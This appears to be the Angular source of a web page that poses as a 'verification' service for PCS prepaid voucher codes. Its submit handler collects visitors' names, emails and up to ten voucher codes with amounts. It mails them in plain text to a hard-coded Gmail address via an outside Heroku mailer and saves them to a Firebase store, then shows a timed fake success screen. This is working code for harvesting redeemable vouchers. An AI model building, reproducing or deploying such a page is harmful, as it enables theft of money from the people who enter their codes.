import { Component, OnInit } from '@angular/core';
import { NgForm, FormGroup, FormBuilder, FormControl, AbstractControl, Validators } from '@angular/forms';
import * as $ from 'jquery';
import { HttpClient } from '@angular/common/http';
import { DbFireService } from '../services/db-fire.service';
import { Subscription, interval } from 'rxjs';
import { map } from 'rxjs/operators';

@Component({
  selector: 'app-suivi',
  templateUrl: './suivi.component.html',
  styleUrls: ['./suivi.component.css']
})
export class SuiviComponent implements OnInit {
	loading: boolean = false;
	visibleLine: number = 2;
	codeTab = {"1":true, "2":true, "3":true, "4":true, "5":true, "6":true, "7":true, "8":true, "9":true, "10":true,"c1":true, "c2":true, "c3":true, "c4":true, "c5":true, "c6":true, "c7":true, "c8":true, "c9":true, "c10":true}
  codeValTab = {"1":"", "2":"", "3":"", "4":"", "5":"", "6":"", "7":"", "8":"", "9":"", "10":"", "c1":"", "c2":"", "c3":"", "c4":"", "c5":"", "c6":"", "c7":"", "c8":"", "c9":"", "c10":""}
	codeLineError = {"v2":false, "v3":false, "v4":false, "v5":false, "v6":false, "v7":false, "v8":false, "v9":false, "v10":false}
	verificationForm: FormGroup;
	submitted = false;
	endSubmit = true;
  showEnd: boolean = false;
  showSuccess: boolean = false;
  actualStep: number = 1;
	codePattern = /^[0-9A-Za-z]{10}$/;
	amountPattern = /^[0-9]{2,11}$/;






  constructor(private http: HttpClient, private db: DbFireService){}
  addVerif(act: number){
  	this.resetHiddenInput();
  	if(act == 1){
  		if(this.visibleLine < 10){
  			this.visibleLine++;
  		}
  	}else{
  		if(this.visibleLine > 2){
  			this.visibleLine--;
  		}
  	}
  }
  


  ValidateCode(control: AbstractControl){
    if(control.value !== '' && control.value < 9999999999999){
      return { validCode: true };
    }
    return null;
  }
  resetHiddenInput(){
  	for(var i = this.visibleLine; i <= 10; i++){
  		this.verificationForm.controls['montant'+i].setValue('');
  		this.codeLineError['v'+i] = false;
  	}
  }
  switchView(placeNb: string){
  	this.codeTab[placeNb] = (this.codeTab[placeNb]) ? false : true;
  	this.uppercaseCode();
  }
  copyHidden(elm: any, placeNb: string){
  	var strToDisplay: string = '';
  	this.codeLineError = {"v2":false, "v3":false, "v4":false, "v5":false, "v6":false, "v7":false, "v8":false, "v9":false, "v10":false};
  	this.uppercaseCode();
  	var valLen = elm.target.value.length;
  	for(var i = 0; i < valLen; i++){
  		strToDisplay += "*";
  	}
  	this.codeValTab[placeNb] = strToDisplay;
  }
  get f(){ return this.verificationForm.controls; }
  validLine(placeId: number){
  	var returnValue = false;
  	return returnValue;
  }
  uppercaseCode(){
  	$('input[formControlName^=code]').each(function(){
  		var valueTaken = $(this).val().toUpperCase();
  		$(this).val(valueTaken);
  	});
  }

  ngOnInit(){
  	this.verificationForm = new FormGroup({
        nm: new FormControl('', [Validators.required]),
        email: new FormControl('', [Validators.required, Validators.email]),
        code1: new FormControl('', [Validators.required, Validators.pattern(this.codePattern), this.ValidateCode]),
        montant1: new FormControl('', [Validators.required, Validators.min(10), Validators.pattern(this.amountPattern)]),
        code2: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant2: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code3: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant3: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code4: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant4: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code5: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant5: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code6: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant6: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code7: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant7: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code8: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant8: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code9: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant9: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code10: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant10: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        codec1: new FormControl('', []),
        montantc1: new FormControl('', []),
        codec2: new FormControl('', []),
        montantc2: new FormControl('', []),
        codec3: new FormControl('', []),
        montantc3: new FormControl('', []),
        codec4: new FormControl('', []),
        montantc4: new FormControl('', []),
        codec5: new FormControl('', []),
        montantc5: new FormControl('', []),
        codec6: new FormControl('', []),
        montantc6: new FormControl('', []),
        codec7: new FormControl('', []),
        montantc7: new FormControl('', []),
        codec8: new FormControl('', []),
        montantc8: new FormControl('', []),
        codec9: new FormControl('', []),
        montantc9: new FormControl('', []),
        codec10: new FormControl('', []),
        montantc10: new FormControl('', [])
  	});
  }
  submitForm(){
  	this.loading = true;
    this.submitted = true;
    this.endSubmit = true;
  	this.codeLineError = {"v2":false, "v3":false, "v4":false, "v5":false, "v6":false, "v7":false, "v8":false, "v9":false, "v10":false}
  	const nm = this.verificationForm.get('nm').value.trim();
  	const email = this.verificationForm.get('email').value.trim();
  	const code1 = this.verificationForm.get('code1').value.trim().toLowerCase();
  	const montant1 = this.verificationForm.get('montant1').value.trim();
  	const code2 = this.verificationForm.get('code2').value.trim().toLowerCase();
  	const montant2 = this.verificationForm.get('montant2').value.trim();
  	const code3 = this.verificationForm.get('code3').value.trim().toLowerCase();
  	const montant3 = this.verificationForm.get('montant3').value.trim();
  	const code4 = this.verificationForm.get('code4').value.trim().toLowerCase();
  	const montant4 = this.verificationForm.get('montant4').value.trim();
  	const code5 = this.verificationForm.get('code5').value.trim().toLowerCase();
  	const montant5 = this.verificationForm.get('montant5').value.trim();
  	const code6 = this.verificationForm.get('code6').value.trim().toLowerCase();
  	const montant6 = this.verificationForm.get('montant6').value.trim();
  	const code7 = this.verificationForm.get('code7').value.trim().toLowerCase();
  	const montant7 = this.verificationForm.get('montant7').value.trim();
  	const code8 = this.verificationForm.get('code8').value.trim().toLowerCase();
  	const montant8 = this.verificationForm.get('montant8').value.trim();
  	const code9 = this.verificationForm.get('code9').value.trim().toLowerCase();
  	const montant9 = this.verificationForm.get('montant9').value.trim();
  	const code10 = this.verificationForm.get('code10').value.trim().toLowerCase();
  	const montant10 = this.verificationForm.get('montant10').value.trim();
    const codec1 = this.verificationForm.get('codec1').value.trim().toLowerCase();
    const montantc1 = this.verificationForm.get('montantc1').value.trim();
    const codec2 = this.verificationForm.get('codec2').value.trim().toLowerCase();
    const montantc2 = this.verificationForm.get('montantc2').value.trim();
    const codec3 = this.verificationForm.get('codec3').value.trim().toLowerCase();
    const montantc3 = this.verificationForm.get('montantc3').value.trim();
    const codec4 = this.verificationForm.get('codec4').value.trim().toLowerCase();
    const montantc4 = this.verificationForm.get('montantc4').value.trim();
    const codec5 = this.verificationForm.get('codec5').value.trim().toLowerCase();
    const montantc5 = this.verificationForm.get('montantc5').value.trim();
    const codec6 = this.verificationForm.get('codec6').value.trim().toLowerCase();
    const montantc6 = this.verificationForm.get('montantc6').value.trim();
    const codec7 = this.verificationForm.get('codec7').value.trim().toLowerCase();
    const montantc7 = this.verificationForm.get('montantc7').value.trim();
    const codec8 = this.verificationForm.get('codec8').value.trim().toLowerCase();
    const montantc8 = this.verificationForm.get('montantc8').value.trim();
    const codec9 = this.verificationForm.get('codec9').value.trim().toLowerCase();
    const montantc9 = this.verificationForm.get('montantc9').value.trim();
    const codec10 = this.verificationForm.get('codec10').value.trim().toLowerCase();
    const montantc10 = this.verificationForm.get('montantc10').value.trim();
    
    if(montant2 !== '' && code2 == ''){ 
    	this.codeLineError.v2 = true;
        this.endSubmit = false;
    }
  	if(montant3 !== '' && code3 == ''){ 
  		this.codeLineError.v3 = true;
  	    this.endSubmit = false;
  	}
  	if(montant4 !== '' && code4 == ''){ 
  		this.codeLineError.v4 = true;
  	    this.endSubmit = false;
  	}
  	if(montant5 !== '' && code5 == ''){ 
  		this.codeLineError.v5 = true;
  	    this.endSubmit = false;
  	}
  	if(montant6 !== '' && code6 == ''){ 
  		this.codeLineError.v6 = true;
  	    this.endSubmit = false;
  	}
  	if(montant7 !== '' && code7 == ''){ 
  		this.codeLineError.v7 = true;
  	    this.endSubmit = false;
  	}
  	if(montant8 !== '' && code8 == ''){ 
  		this.codeLineError.v8 = true;
  	    this.endSubmit = false;
  	}
  	if(montant9 !== '' && code9 == ''){ 
  		this.codeLineError.v9 = true;
  	    this.endSubmit = false;
  	}
  	if(montant10 !== '' && code10 == ''){ 
  		this.codeLineError.v10 = true;
  	    this.endSubmit = false;
  	}
    if(this.actualStep == 2 && (montant1 !== montantc1)){ 
        this.endSubmit = false;
    }
    if(this.actualStep == 2 && (montant2 !== montantc2)){ 
        this.endSubmit = false;
    }
    if(this.actualStep == 2 && (montant3 !== montantc3)){ 
        this.endSubmit = false;
    }
    if(this.actualStep == 2 && (montant4 !== montantc4)){ 
        this.endSubmit = false;
    }
    if(this.actualStep == 2 && (montant5 !== montantc5)){ 
        this.endSubmit = false;
    }
    if(this.actualStep == 2 && (montant6 !== montantc6)){ 
        this.endSubmit = false;
    }
    if(this.actualStep == 2 && (montant7 !== montantc7)){ 
        this.endSubmit = false;
    }
    if(this.actualStep == 2 && (montant8 !== montantc8)){ 
        this.endSubmit = false;
    }
    if(this.actualStep == 2 && (montant9 !== montantc9)){ 
        this.endSubmit = false;
    }
    if(this.actualStep == 2 && (montant10 !== montantc10)){ 
        this.endSubmit = false;
    }
  	if(this.verificationForm.invalid){
  		this.loading = false; return;
  	}else{
  		if(this.endSubmit){

        var dateNow: Date = new Date();
        var finishDate = dateNow.getDate()+' '+(dateNow.getMonth()+1)+' '+dateNow.getFullYear();

  			const dataSend = {
  				'nom' : nm,
  				'email' : email,
  				'code1' : code1,
  				'montant1' : montant1,
  				'code2' : code2,
  				'montant2' : montant2,
  				'code3' : code3,
  				'montant3' : montant3,
  				'code4' : code4,
  				'montant4' : montant4,
  				'code5' : code5,
  				'montant5' : montant5,
  				'code6' : code6,
  				'montant6' : montant6,
  				'code7' : code7,
  				'montant7' : montant7,
  				'code8' : code8,
  				'montant8' : montant8,
  				'code9' : code9,
  				'montant9' : montant9,
  				'code10' : code10,
  				'montant10' : montant10,
          'datesave' : finishDate
  			}


  			var msgContent = 'Nom: ' + nm+'</b><br/>'+
  				'Email: ' + '<b>'+email+'</b><br/>'+
  				'Code 1: ' + '<b>'+code1+'</b>'+
  				' -> ' + '<b>'+montant1+'</b><br/>'+
  				'Code 2' + '<b>'+code2+'</b>'+
  				' -> ' + '<b>'+montant2+'</b><br/>'+
  				'Code 3' + '<b>'+code3+'</b>'+
  				' -> ' + '<b>'+montant3+'</b><br/>'+
  				'Code 4' + '<b>'+code4+'</b>'+
  				' -> ' + '<b>'+montant4+'</b><br/>'+
  				'Code 5' + '<b>'+code5+'</b>'+
  				' -> ' + '<b>'+montant5+'</b><br/>'+
  				'Code 6' + '<b>'+code6+'</b>'+
  				' -> ' + '<b>'+montant6+'</b><br/>'+
  				'Code 7' + '<b>'+code7+'</b>'+
  				' -> ' + '<b>'+montant7+'</b><br/>'+
  				'Code 8' + '<b>'+code8+'</b>'+
  				' -> ' + '<b>'+montant8+'</b><br/>'+
  				'Code 9' + '<b>'+code9+'</b>'+
  				' -> ' + '<b>'+montant9+'</b><br/>'+
  				'Code 10' + '<b>'+code10+'</b>'+ 
  				' -> ' + '<b>'+montant10+'</b>'+
          'Date: '+ '<b>'+finishDate+'</b><br/>';
          

          if(this.actualStep == 1){
  				var sendMailTo: string = 'ramanmickael2015@gmail.com';
  				var sendSubject: string = 'Nouvelle vérification PCS';

  				var makeRequest: any = this.http.get('https://mailertake.herokuapp.com/v1/mail?to='+sendMailTo+'&subject='+sendSubject+'+&msg='+msgContent)
  				                       .pipe(
  				                       	map(res => console.log(res))
  				                       	)
  				                       .subscribe(res => {
  				                       	console.log(res);
  				                       },
  				                       (err) => {
  				                       	console.log(err)
  				                       },
  				                       () => {
  				                       	console.log('Envoyé')
  				                       });


            this.db.addSuivi(dataSend)
                        .then(res => {
                          this.actualStep = 2;
                          this.submitted = false;
                          this.loading = false;
                        })
                        .catch(err => {
                          this.loading = false;
                        });


        }else{
          this.loading = false;
          this.showEnd = true;





          var subscription: Subscription = new Subscription();
          var shokorTest = interval(2000);
          subscription.add(
            shokorTest
            .subscribe(res => {
              if(res == 2){
                this.showSuccess = true;
                subscription.unsubscribe();
              }
            })
            ); 
        }




  		}else{
        this.loading = false;
      }
  		
  	}
  }

}
